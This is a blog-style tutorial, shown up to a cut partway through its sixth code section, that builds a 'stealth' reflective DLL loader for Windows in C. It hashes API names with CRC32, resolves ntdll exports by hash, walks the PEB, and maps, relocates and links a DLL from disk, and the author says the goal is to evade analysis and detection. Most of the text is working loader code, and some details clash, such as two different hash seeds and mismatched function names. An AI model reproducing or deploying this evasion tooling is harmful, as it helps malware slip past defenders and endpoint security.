---
title: "Our Stealth Loader "
date: 2024-05-22 00:00:00 +0800
categories: [Stealth Loader]
tags: [Stealth Loader]
---
![loader](/assets/images/windows loader.png)<br/>
In the previous article of our [loader](https://ote22.github.io), we implemented a rudimentary version that facilitated the transfer of a file from disk to memory, along with basic address resolution. However, for our enhanced stealth loader, we're adopting a more sophisticated approach. Instead of directly invoking functions by their names, which could potentially expose our operations, we're implementing a wrapper that utilizes function hashes for calling. To accomplish this, we'll create two indispensable helper functions: one for hashing and another for retrieving the address from the hash with the base of the dll file.
- Helper function Implementation
    - first function: CRC32 takes a string and return a hash for storage
    - second function: get_add_by_hash take base address of DLL and hashed function and return function address.
- Stealthy Loader
    - use NTAPI functions
    - stealth loader part 1
    - stealth loader part 2
    - stealth loader part 3
    - stealth loader part 4
    - stealth loader part 5
    - stealth loader part 6
    - stealth loader part 7
## Helper functions
- CRC32b
    ```c
    #include <stdint.h>

    //define some macros
    #define SEED 0xFEADFEAD 
    #define GETHASH(func) (crc32b((uint8_t*)func))

    uint32_t crc32b(const uint8_t *str) {

        uint32_t crc = 0xFFFFFFFF;
        uint32_t byte;
        uint32_t mask;
        int i = 0x0;
        int j;

        while (str[i] != 0) {
            byte = str[i];
            crc = crc ^ byte;
            for (j = 7; j >= 0; j--) {
                mask = -1 * (crc & 1);
                crc = (crc >> 1) ^ (SEED & mask);
            }
            i++;
        }
        return ~crc;
    }
    ```
    - here is the expalanation of the above code:<br/>
        This C code defines a function `crc32b` that calculates the CRC-32 checksum of a given input string `str`. Here's a breakdown of how it works:

        1. `uint32_t crc = 0xFFFFFFFF;`: Initializes the CRC variable with an initial value of `0xFFFFFFFF`.

        2. `uint32_t byte;`: Declares a variable to hold each byte of the input string.

        3. `uint32_t mask;`: Declares a variable to hold a mask value used in the CRC calculation.

        4. `int i = 0x0;`: Initializes a loop counter `i` to zero.

        5. `int j;`: Declares a loop counter `j` for an inner loop.


        6. `while (str[i] != 0) { ... }`: Starts a loop that iterates through each byte of the input string until it encounters a null terminator (`'\0'`).

        7. `byte = str[i];`: Retrieves the next byte from the input string.

        8. `crc = crc ^ byte;`: XORs the current byte with the current CRC value.

        9. `for (j = 7; j >= 0; j--) { ... }`: Starts an inner loop that iterates 8 times, corresponding to each bit in a byte.

        10. `mask = -1 * (crc & 1);`: Computes a mask based on the least significant bit of the current CRC value.

        11. `crc = (crc >> 1) ^ (SEED & mask);`: Updates the CRC value by shifting it right by one bit and applying the CRC polynomial (represented by `SEED`) if the least significant bit was set.

        12. `i++;`: Moves to the next byte in the input string.

        13. `return ~crc;`: Returns the one's complement of the final CRC value.

        this function calculates the CRC-32 checksum of the input string using bitwise operations and a predefined CRC polynomial (represented by `SEED`). It's a commonly used technique for error detection and data integrity checking.
- Get address from Hash:<br/>
    ```c
    void *get_proc_address_by_hash(void *dll_address, uint32_t function_hash) {
    void *base = dll_address;
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)base + dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)base + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    unsigned long *p_address_of_functions = (PDWORD)((DWORD_PTR)base + export_directory->AddressOfFunctions);
    unsigned long *p_address_of_names = (PDWORD)((DWORD_PTR)base + export_directory->AddressOfNames);
    unsigned short *p_address_of_name_ordinals = (PWORD)((DWORD_PTR)base + export_directory->AddressOfNameOrdinals);

    for(unsigned long i = 0; i < export_directory->NumberOfNames; i++) {
        LPCSTR p_function_name = (LPCSTR)((DWORD_PTR)base + p_address_of_names[i]);
        unsigned short p_function_ordinal = (unsigned short)p_address_of_name_ordinals[i];
        unsigned long p_function_address = (unsigned long)p_address_of_functions[p_function_ordinal];

        if(function_hash == HASH(p_function_name))
            return (void *)((DWORD_PTR)base + p_function_address);
    }
    return NULL;
    }
    ```
    - here is the expalanation of the above code:<br/>
        1. `void *get_proc_address_by_hash(void *dll_address, uint32_t function_hash) {`
        - This function leverages Windows internals and the PE format to dynamically resolve function addresses within a DLL based on their hashed names. It takes two parameters: `dll_address`, a pointer to the base address of the DLL, and `function_hash`, the hash value of the function we want to find the address for.

        2. `void *base = dll_address;`
        - This line initializes a pointer `base` to the provided `dll_address`, representing the base address of the DLL in memory.

        3. `PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;`
        - Here, we cast the `base` pointer to a pointer to the `IMAGE_DOS_HEADER` structure, accessing the DOS header of the DLL. This header provides essential information about the PE file structure.

        4. `PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)base + dos_header->e_lfanew);`
        - This line calculates the offset to the NT headers using the `e_lfanew` field of the DOS header and adds it to the base address. The NT headers contain critical information about the PE file, including the export directory.

        5. `PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)base + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);`
        - It computes the pointer to the export directory using the virtual address stored in the Data Directory of the NT headers. The export directory holds information about exported functions, including their names and addresses.

        6. `unsigned long *p_address_of_functions = (PDWORD)((DWORD_PTR)base + export_directory->AddressOfFunctions);`
        - This line calculates the pointer to the array of function addresses within the export directory, which represents the actual addresses of the exported functions.

        7. `unsigned long *p_address_of_names = (PDWORD)((DWORD_PTR)base + export_directory->AddressOfNames);`
        - Similar to the previous line, this calculates the pointer to the array of function names within the export directory. These names are used to compare against the provided hash value.

        8. `unsigned short *p_address_of_name_ordinals = (PWORD)((DWORD_PTR)base + export_directory->AddressOfNameOrdinals);`
        - This line calculates the pointer to the array of function ordinals within the export directory. Ordinals serve as indices for the address array.

        9. `for(unsigned long i = 0; i < export_directory->NumberOfNames; i++) {`
        - It enters a loop that iterates through each function name in the export directory. The loop runs for the total number of exported function names (`NumberOfNames`).

        10. `LPCSTR p_function_name = (LPCSTR)((DWORD_PTR)base + p_address_of_names[i]);`
            - It calculates the pointer to the current function name by adding the base address to the offset stored in `p_address_of_names`.

        11. `unsigned short p_function_ordinal = (unsigned short)p_address_of_name_ordinals[i];`
            - This line retrieves the ordinal of the current function from the `p_address_of_name_ordinals` array.

        12. `unsigned long p_function_address = (unsigned long)p_address_of_functions[p_function_ordinal];`
            - It retrieves the address of the current function from the `p_address_of_functions` array using the ordinal as an index.

        13. `if(function_hash == HASH(p_function_name))`
            - This condition checks if the hash value of the current function name matches the `function_hash` provided as an argument.

        14. `return (void *)((DWORD_PTR)base + p_function_address);`
            - If a match is found, it returns the address of the matched function, adjusted by the base address of the DLL.

        15. `return NULL;`
            - If no match is found after iterating through all function names, it returns NULL.<br/>
    - The `crc32b` function hashes function names, which are then used by the `get_proc_address_by_hash` function to dynamically resolve function addresses within a DLL.
    - Native API with function pointer obfuscation:<br/>
    in our stealth loader we are going to use Native API calls with function pointer obfuscation, thats  means leveraging lower-level system calls directly from ntdll.dll instead of the higher-level Windows API functions inorder to make it harder to analyze and detect our loader's behavior<br/>
    in our basic [loader](https://ote22.github.io) we have used the WINAPI  to do the task :<br/>
        - However ,To implement file operations using native API calls without relying on the higher-level Windows API, we'll use several Native API functions provided by ntdll.dll. Below is the C code with the necessary data structures and function declarations for the native API calls:

            - Creating the Unicode string: RtlInitUnicodeString
            - Creating or opening a file: NtCreateFile
            - Getting file information: NtQueryInformationFile
            - Allocating memory: NtAllocateVirtualMemory
            - Reading file contents: NtReadFile
        - To achieve the functionality you need without directly relying on ntdll.dll, you would need to redefine the prototypes for the Native API functions manually based on their definitions you can use the implementation of the ntdll.h header using this  [file](https://github.com/x64dbg/x64dbg/blob/development/src/dbg/ntdll/ntdll.h?ref=blog.malicious.group).<br/>
        lets take `NtCreateFile` as an example
        and by using the ntdll.h we have its declaration as the following:<br/>
        ```c
            NTSYSCALLAPI
            NTSTATUS
            NTAPI
            NtCreateFile(
                _Out_ PHANDLE FileHandle,
                _In_ ACCESS_MASK DesiredAccess,
                _In_ POBJECT_ATTRIBUTES ObjectAttributes,
                _Out_ PIO_STATUS_BLOCK IoStatusBlock,
                _In_opt_ PLARGE_INTEGER AllocationSize,
                _In_ ULONG FileAttributes,
                _In_ ULONG ShareAccess,
                _In_ ULONG CreateDisposition,
                _In_ ULONG CreateOptions,
                _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
                _In_ ULONG EaLength
            );

            ```
            Since we are not using ntdll.dll directly, we will check each function prototype in ntdll.h and create our own versions. For example, for NtCreateFile, we will manually define its prototype and use it in our code. This approach ensures that our loader remains stealthy and difficult to reverse-engineer by avoiding conventional Windows API calls and obfuscating function pointers.
            ```c
            typedef NTSTATUS (__stdcall *NtCreateFile_t)(arguments of the function as listed)
            ```
            We will apply the same strategy to other functions such as `NtReadFile`, `NtClose`, `NtAllocateVirtualMemory`, and `NtProtectVirtualMemory`,....
            ```c
                
            typedef VOID     (__stdcall *PIO_APC_ROUTINE)(PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,ULONG Reserved);
            typedef VOID     (__stdcall *RtlInitUnicodeString_t)(PUNICODE_STRING DestinationString, PWSTR SourceString);
            typedef NTSTATUS (__stdcall *NtCreateFile_t)(PHANDLE FileHandle,ACCESS_MASK DesiredAccess,POBJECT_ATTRIBUTES ObjectAttributes,PIO_STATUS_BLOCK IoStatusBlock,PLARGE_INTEGER AllocationSize,ULONG FileAttributes,ULONG ShareAccess,ULONG CreateDisposition,ULONG CreateOptions,PVOID EaBuffer,ULONG EaLength);
            typedef NTSTATUS (__stdcall *NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
            typedef NTSTATUS (__stdcall *NtQueryInformationFile_t)(HANDLE FileHandle,PIO_STATUS_BLOCK IoStatusBlock,PVOID FileInformation,ULONG Length,FILE_INFORMATION_CLASS FileInformationClass);
            typedef NTSTATUS (__stdcall *NtReadFile_t)(HANDLE FileHandle,HANDLE Event,PIO_APC_ROUTINE ApcRoutine,PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,PVOID Buffer,ULONG Length,PLARGE_INTEGER ByteOffset,PULONG Key);

            ```
            Another issue arises as certain data structures used in the aforementioned functions are unresolved since we're not directly utilizing `ntdll.h` in our loader. Consequently, we need to implement these data structures ourselves.:
            - UNICODE_STRING
            - OBJECT_ATTRIBUTES
            - IO_STATUS_BLOCK
            - FILE_STANDARD_INFORMATION
            - PIO_APC_ROUTINE
            ```c
                typedef struct _UNICODE_STRING {
                                USHORT Length;
                                USHORT MaximumLength;
                                PWSTR Buffer;
                            } UNICODE_STRING, *PUNICODE_STRING;

                typedef struct _OBJECT_ATTRIBUTES {
                                ULONG Length;
                                HANDLE RootDirectory;
                                PUNICODE_STRING ObjectName;
                                ULONG Attributes;
                                PVOID SecurityDescriptor;
                                PVOID SecurityQualityOfService;
                            } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

                typedef struct _IO_STATUS_BLOCK {
                                union {
                                    NTSTATUS Status;
                                    PVOID Pointer;
                                } DUMMYUNIONNAME;
                                ULONG_PTR Information;
                            } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

                typedef struct _FILE_STANDARD_INFORMATION {
                                LARGE_INTEGER AllocationSize;
                                LARGE_INTEGER EndOfFile;
                                ULONG NumberOfLinks;
                                BOOLEAN DeletePending;
                                BOOLEAN Directory;
                            } FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;

                typedef enum _FILE_INFORMATION_CLASS {
                                FileDirectoryInformation = 1, 
                                FileFullDirectoryInformation, 
                                FileBothDirectoryInformation, 
                                FileBasicInformation, 
                                FileStandardInformation, 
                                FileInternalInformation, 
                                FileEaInformation, 
                                FileAccessInformation, 
                                FileNameInformation, 
                                FileRenameInformation, 
                                FileLinkInformation, 
                                FileNamesInformation, 
                                FileDispositionInformation, 
                                FilePositionInformation, 
                                FileFullEaInformation, 
                                FileModeInformation, 
                                FileAlignmentInformation, 
                                FileAllInformation, 
                                FileAllocationInformation, 
                                FileEndOfFileInformation, 
                                FileAlternateNameInformation, 
                                FileStreamInformation, 
                                FilePipeInformation, 
                                FilePipeLocalInformation, 
                                FilePipeRemoteInformation, 
                                FileMailslotQueryInformation, 
                                FileMailslotSetInformation, 
                                FileCompressionInformation, 
                                FileObjectIdInformation, 
                                FileCompletionInformation, 
                                FileMoveClusterInformation, 
                                FileQuotaInformation, 
                                FileReparsePointInformation, 
                                FileNetworkOpenInformation, 
                                FileAttributeTagInformation, 
                                FileTrackingInformation, 
                                FileIdBothDirectoryInformation, 
                                FileIdFullDirectoryInformation, 
                                FileValidDataLengthInformation, 
                                FileShortNameInformation, 
                                FileIoCompletionNotificationInformation, 
                                FileIoStatusBlockRangeInformation, 
                                FileIoPriorityHintInformation, 
                                FileSfioReserveInformation, 
                                FileSfioVolumeInformation, 
                                FileHardLinkInformation, 
                                FileProcessIdsUsingFileInformation, 
                                FileNormalizedNameInformation, 
                                FileNetworkPhysicalNameInformation, 
                                FileIdGlobalTxDirectoryInformation, 
                                FileIsRemoteDeviceInformation, 
                                FileUnusedInformation,
                                FileNumaNodeInformation, 
                                FileStandardLinkInformation, 
                                FileRemoteProtocolInformation, 
                                FileRenameInformationBypassAccessCheck, 
                                FileLinkInformationBypassAccessCheck, 
                                FileVolumeNameInformation, 
                                FileIdInformation, 
                                FileIdExtdDirectoryInformation, 
                                FileReplaceCompletionInformation, 
                                FileHardLinkFullIdInformation, 
                                FileIdExtdBothDirectoryInformation, 
                                FileDispositionInformationEx, 
                                FileRenameInformationEx,
                                FileRenameInformationExBypassAccessCheck,
                                FileDesiredStorageClassInformation, 
                                FileStatInformation, 
                                FileMaximumInformation
                            } FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;
            ```
            - Excellent progress! Now, we'll hash the resolved NTAPI function pointers for future retrieval. This hashing process will enable us to map the hashed values to their corresponding function pointers when needed.
            ```c
                #define SEED 0xDEADDEAD
                #define HASH(API)(crc32b((uint8_t *)API))

                #define RtlInitUnicodeString_CRC32b         0xe17f353f
                #define NtCreateFile_CRC32b                 0x962c4683
                #define NtAllocateVirtualMemory_CRC32b      0xec50426f
                #define NtQueryInformationFile_CRC32b       0xb54956cb
                #define NtReadFile_CRC32b                   0xab569438
            ```
    - Function Obfuscation<br/>
        
        Once again, we've encountered a hurdle. Since we've hashed the functions and need to call them, we first must ascertain the base address of the ntdll library. Let's pause and delve into the ntdll library and some of its characteristics. Notably, the ntdll library shares the same base address across all processes. Therefore, we need to parse the PEB format inside the process to extract the base address of the ntdll library. I highly recommend exploring this [repository](https://github.com/Faran-17/Windows-Internals/blob/main/Processes%20and%20Jobs/Processes/PEB%20-%20Part%201.md) to get deep understanding of PEB,TIB Datastructure inside a  process and threads respectively.<br/>
        ```c
        #include <windows.h>
        #include <stdio.h>

        // Define necessary structures manually, avoiding re-definition of LIST_ENTRY
        typedef struct _UNICODE_STRING {
            USHORT Length;
            USHORT MaximumLength;
            PWSTR Buffer;
        } UNICODE_STRING, *PUNICODE_STRING;

        typedef struct _LDR_DATA_TABLE_ENTRY {
            LIST_ENTRY InLoadOrderLinks;
            LIST_ENTRY InMemoryOrderLinks;
            LIST_ENTRY InInitializationOrderLinks;
            PVOID DllBase;
            PVOID EntryPoint;
            ULONG SizeOfImage;
            UNICODE_STRING FullDllName;
            UNICODE_STRING BaseDllName;
            ULONG Flags;
            SHORT LoadCount;
            SHORT TlsIndex;
            LIST_ENTRY HashLinks;
            PVOID SectionPointer;
            ULONG CheckSum;
            ULONG TimeDateStamp;
            PVOID LoadedImports;
            PVOID EntryPointActivationContext;
            PVOID PatchInformation;
        } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

        typedef struct _PEB_LDR_DATA {
            ULONG Length;
            BOOLEAN Initialized;
            HANDLE SsHandle;
            LIST_ENTRY InLoadOrderModuleList;
            LIST_ENTRY InMemoryOrderModuleList;
            LIST_ENTRY InInitializationOrderModuleList;
        } PEB_LDR_DATA, *PPEB_LDR_DATA;

        typedef struct _PEB {
            BYTE Reserved1[2];
            BYTE BeingDebugged;
            BYTE Reserved2[1];
            PVOID Reserved3[2];
            PPEB_LDR_DATA Ldr;
            // Other members are not needed for this example
        } PEB, *PPEB;

        // Function to get the base address of ntdll.dll
        void* get_ntdll() {
        #ifdef _WIN64
            PPEB pPeb = (PPEB)__readgsqword(0x60); // Get PEB from TIB (x64)
        #else
            PPEB pPeb;
            __asm__ (
                "movl %%fs:0x30, %0"
                : "=r" (pPeb)
            ); // Get PEB from TIB (x86)
        #endif
            PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->Ldr;
            PLIST_ENTRY pListEntry = pLdr->InMemoryOrderModuleList.Flink;

            while (pListEntry != &pLdr->InMemoryOrderModuleList) {
                PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
                if (_wcsicmp(pEntry->BaseDllName.Buffer, L"ntdll.dll") == 0) {
                    return pEntry->DllBase;
                }
                pListEntry = pListEntry->Flink;
            }
            return NULL;
        }

        ```
        - Great news! Now, we have the base address of the ntdll library, and we can use it to extract the addresses of the functions used by our stealth loader.
        - Returning to obfuscating the function pointers and hiding the function names in the binary file, we have to follow some steps:
            - step 1:
                - get a valid pointer to the base address of the ntdll library: 
                ```c
                void *pntdll=get_ndll();
                ```
                - create a void pointer to the func name and resolve teh base address by get_proc_address_by_hash and sure you have to use the hash  we previously get to get the correct function!!!!. 
                - at last cast the function pointer to its definition type.
                let began with the NtCreateFile.
                ```c
                    void *p_nt_create_file=get_proc_address_by_hash(pntdll,NtCreateFile_CRC32b);
                    NtCreateFile_t g_nt_create_file =(NtCreateFile_t) p_nt_create_file;// casting g_nt_create_file as NtCreateFile_t 
                ```
    - Stealh Loader Part1
    ```c
        NTSTATUS status;
        UNICODE_STRING dll_file;
        WCHAR w_file_path[100] = L"\\??\\\\C:\\Temp\\dll_poc.dll";

        void *p_ntdll = get_ntdll();
        void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32b);
        RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;

        g_rtl_init_unicode_string(&dll_file, w_file_path);

        OBJECT_ATTRIBUTES obj_attrs;
        IO_STATUS_BLOCK io_status_block;
        InitializeObjectAttributes(&obj_attrs, &dll_file, 0x00000040L, NULL, NULL);

        HANDLE h_file = NULL;

        void *p_nt_create_file = get_proc_address_by_hash(p_ntdll, NtCreateFile_CRC32b);
        NtCreateFile_t g_nt_create_file = (NtCreateFile_t) p_nt_create_file;

        if((status = g_nt_create_file(&h_file, SYNCHRONIZE | GENERIC_READ, &obj_attrs, &io_status_block, 0, 0x0000080, 0x0000007, FILE_OPEN_IF, 0x0000020, 0x0000000, 0)) != 0x0)
            return -1;

        FILE_STANDARD_INFORMATION file_standard_info;

        void *p_nt_query_information_file = get_proc_address_by_hash(p_ntdll, NtQueryInformationFile_CRC32b);
        NtQueryInformationFile_t g_nt_query_information_file = (NtQueryInformationFile_t) p_nt_query_information_file;
        if((status = g_nt_query_information_file(h_file, &io_status_block, &file_standard_info, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation)) != 0x0)
            return -2;

        unsigned long long int dll_size = file_standard_info.EndOfFile.QuadPart;
        void *dll_bytes = NULL;
        void *p_nt_allocate_virtual_memory = get_proc_address_by_hash(p_ntdll, NtAllocateVirtualMemory_CRC32b);
        NtAllocateVirtualMemory_t g_nt_allocate_virtual_memory = (NtAllocateVirtualMemory_t) p_nt_allocate_virtual_memory;
        if((status = g_nt_allocate_virtual_memory(((HANDLE) -1), &dll_bytes, 0, &dll_size, MEM_COMMIT, PAGE_READWRITE)) != 0x0)
            return -3;

        void *p_nt_read_file = get_proc_address_by_hash(p_ntdll, NtReadFile_CRC32b);
        NtReadFile_t g_nt_read_file = (NtReadFile_t)p_nt_read_file;

        if((status = g_nt_read_file(h_file, NULL, NULL, NULL, &io_status_block, dll_bytes, dll_size, 0, NULL)) != 0x0)
            return -4;
    ```
    this code is the same as the part 1 of our original loader but we have used the NTAPI functions with name hasing and function obfuscation
    - stealth Loader Part 2:
    ```c
        PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_bytes;
        PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((unsigned long long int)dll_bytes + dos_header->e_lfanew);
        SIZE_T dll_image_size = nt_headers->OptionalHeader.SizeOfImage;
    ```
    - stealth Loader Part 3:
    ```c
        void *dll_base = NULL;
        if((status = g_nt_allocate_virtual_memory(((HANDLE) -1), &dll_base, 0, &dll_image_size, MEM_COMMIT, PAGE_READWRITE)) != 0x0)
            return -4;

        unsigned long long int delta_image_base = (unsigned long long int)dll_base - (unsigned long long int)nt_headers->OptionalHeader.ImageBase;
        memcpy(dll_base, dll_bytes, nt_headers->OptionalHeader.SizeOfHeaders);

        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
        for(size_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
            void *section_destination = (LPVOID)((unsigned long long int)dll_base + (unsigned long long int)section->VirtualAddress);
            void *section_bytes = (LPVOID)((unsigned long long int)dll_bytes + (unsigned long long int)section->PointerToRawData);
            memcpy(section_destination, section_bytes, section->SizeOfRawData);
            section++;
        }
    ```
        1. **Allocate Memory for DLL Header**:
        - First, memory is allocated to store the DLL's header.
        - This is done by calling `NtAllocateVirtualMemory` to allocate memory, typically the size of the DLL's header.
        - The DLL's header is then copied into this allocated memory using `memcpy`.

        2. **Calculate Offset**:
        - The difference between the base address of the allocated memory and the ImageBase address in the DLL's PE file header is calculated.
        - This offset is necessary for later when copying sections of the DLL.

        3. **Iterate Through DLL Sections**:
        - The code iterates through each section of the DLL as defined in its PE file header.
        - For each section, memory is allocated to store the section's contents.
        - The section's contents are then copied into the allocated memory using `memcpy`.
        - The offset calculated earlier is added to the destination address to ensure proper copying.

    - stealth Loader part 4:
    ```c
        IMAGE_DATA_DIRECTORY relocations = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        unsigned long long int relocation_table = relocations.VirtualAddress + (unsigned long long int)dll_base;
        unsigned long relocations_processed = 0;

        while(relocations_processed < relocations.Size) {
            PBASE_RELOCATION_BLOCK relocation_block = (PBASE_RELOCATION_BLOCK)(relocation_table + relocations_processed);
            relocations_processed += sizeof(BASE_RELOCATION_BLOCK);
            unsigned long relocations_count = (relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocation_entries = (PBASE_RELOCATION_ENTRY)(relocation_table + relocations_processed);

            for(unsigned long i = 0; i < relocations_count; i++) {
                relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
                if(relocation_entries[i].Type == 0)
                    continue;

                unsigned long long int relocation_rva = relocation_block->PageAddress + relocation_entries[i].Offset;
                unsigned long long int address_to_patch = 0;
                void *p_nt_read_virtual_memory = get_proc_address_by_hash(p_ntdll, NtReadVirtualMemory_CRC32b);
                NtReadVirtualMemory_t g_nt_read_virtual_memory = (NtReadVirtualMemory_t) p_nt_read_virtual_memory;
                if((status = g_nt_read_virtual_memory(((HANDLE) -1), (void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch, sizeof(unsigned long long int), NULL)) != 0x0)
                    return -5;

                address_to_patch += delta_image_base;
                memcpy((void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch, sizeof(unsigned long long int));
            }
        }
    ```
        1. **Get Relocation Data Directory**:
        - It starts by obtaining the relocation data directory from the DLL's PE header.
        - This directory provides information about the relocation table, which is used for adjusting addresses when the DLL is loaded at a new base address.

        2. **Calculate Relocation Table RVA**:
        - Once the relocation data directory is obtained, the code calculates the RVA (Relative Virtual Address) of the relocation table.
        - This is the address within the DLL where the relocation table is located.

        3. **Iterate Over Each Block in Relocation Table**:
        - The code iterates over each block in the relocation table.
        - Each block contains a set of relocation entries, which specify the type of relocation and the offset within the DLL where the address needs to be patched.

        4. **Calculate Patch Address**:
        - For each relocation entry, the code calculates the address within the DLL that needs to be patched.
        - This is done by adding the base address of the DLL to the RVA of the relocation block and the offset specified in the relocation entry.

        5. **Perform Address Patching**:
        - The code reads the original value at the calculated patch address.
        - It then adds the delta image base (the difference between the original base address and the new base address) to this value.
        - Finally, it writes the updated value back to the same location in memory, effectively relocating the address to the new base address.

        6. **Repeat for Each Relocation Entry**:
        - This process is repeated for each relocation entry in the relocation table, ensuring that all addresses requiring relocation are properly adjusted.

        By performing this relocation process, the code ensures that the DLL can run correctly at its new base address, accommodating changes in memory layout or loading conditions. This is crucial for ensuring the correct execution of the DLL within the context of the application or system where it is loaded.
    - stealth Loader Part 5:
        ```c
        PIMAGE_IMPORT_DESCRIPTOR import_descriptor;
        IMAGE_DATA_DIRECTORY images_directory = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        UNICODE_STRING import_library_name;

        import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(images_directory.VirtualAddress + (unsigned long long int)dll_base);
        void *current_library = NULL;

        while(import_descriptor->Name != 0) {
            void *p_ldr_load_dll = get_proc_address_by_hash(p_ntdll, LdrLoadDll_CRC32b);
            char *module_name = (char *)dll_base + import_descriptor->Name;
            wchar_t w_module_name[MAX_PATH];
            unsigned long num_converted;

            void *p_rtl_multi_byte_to_unicode_n = get_proc_address_by_hash(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);
            RtlMultiByteToUnicodeN_t g_rtl_multi_byte_to_unicode_n = (RtlMultiByteToUnicodeN_t) p_rtl_multi_byte_to_unicode_n;
            if((status = g_rtl_multi_byte_to_unicode_n(w_module_name, sizeof(w_module_name), &num_converted, module_name, sl(module_name) +1)) != 0x0)
                return -5;

            g_rtl_init_unicode_string(&import_library_name, w_module_name);
            LdrLoadDll_t g_ldr_load_dll = (LdrLoadDll_t) p_ldr_load_dll;
            if((status = g_ldr_load_dll(NULL, NULL, &import_library_name, &current_library)) != 0x0)
                return -6;

            if (current_library){
                ANSI_STRING a_string;
                PIMAGE_THUNK_DATA thunk = NULL;
                PIMAGE_THUNK_DATA original_thunk = NULL;
                thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->FirstThunk);
                original_thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->OriginalFirstThunk);
                while (thunk->u1.AddressOfData != 0){
                    void *p_ldr_get_procedure_address = get_proc_address_by_hash(p_ntdll, LdrGetProcedureAddress_CRC32b);
                    LdrGetProcedureAddress_t g_ldr_get_procedure_address = (LdrGetProcedureAddress_t) p_ldr_get_procedure_address;
                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                        g_ldr_get_procedure_address(current_library, NULL, (WORD) original_thunk->u1.Ordinal, (PVOID *) &(thunk->u1.Function));
                    } else {
                        PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((unsigned long long int)dll_base + thunk->u1.AddressOfData);
                        FILL_STRING(a_string, functionName->Name);
                        g_ldr_get_procedure_address(current_library, &a_string, 0, (PVOID *) &(thunk->u1.Function));
                    }
                    ++thunk;
                    ++original_thunk;
                }
            }
            import_descriptor++;
            }
        ```
1. **Iterate Through Import Descriptors**:
        - It starts by iterating through the import descriptors of the DLL, which contain information about the libraries and functions imported by the DLL.
        - The iteration continues until a null terminator is encountered in the import descriptors.

        2. **Resolve Library Name**:
        - For each import descriptor, it retrieves the name of the imported library and converts it to a Unicode string.
        - It uses `RtlMultiByteToUnicodeN` to convert the library name from a multi-byte string to a Unicode string.

        3. **Load Library**:
        - It calls `LdrLoadDll` to load the imported library.
        - If successful, it obtains a handle to the loaded library.

        4. **Resolve Function Addresses**:
        - For each imported function, it iterates through the thunk data, which contains information about the imported functions.
        - It resolves the address of each imported function using `LdrGetProcedureAddress`.
        - If the function is imported by name, it retrieves the function name from the import address table and resolves its address.
        - If the function is imported by ordinal, it directly resolves the address using the ordinal number.

        5. **Repeat for Each Import Descriptor**:
        - This process is repeated for each import descriptor in the DLL.

        Overall, this code segment dynamically resolves the addresses of imported functions by iterating through the import descriptors, loading the necessary libraries, and resolving the function addresses using their names or ordinals. This ensures that the DLL can successfully link to and call the functions from the imported libraries.
    - stealth Loader part 6:
    ```c
        PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);
        for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section_header++) {
            if (section_header->SizeOfRawData) {
                unsigned long executable = (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
                unsigned long readable = (section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
                unsigned long writeable = (section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
                unsigned long protect = 0;

                if (!executable && !readable && !writeable)
                    protect = PAGE_NOACCESS;
                else if (!executable && !readable && writeable)
                    protect = PAGE_WRITECOPY;
                else if (!executable && readable && !writeable)
                    protect = PAGE_READONLY;
                else if (!executable && readable && writeable)
                    protect = PAGE_READWRITE;
                else if (executable && !readable && !writeable)
                    protect = PAGE_EXECUTE;
                else if (executable && !readable && writeable)
                    protect = PAGE_EXECUTE_WRITECOPY;
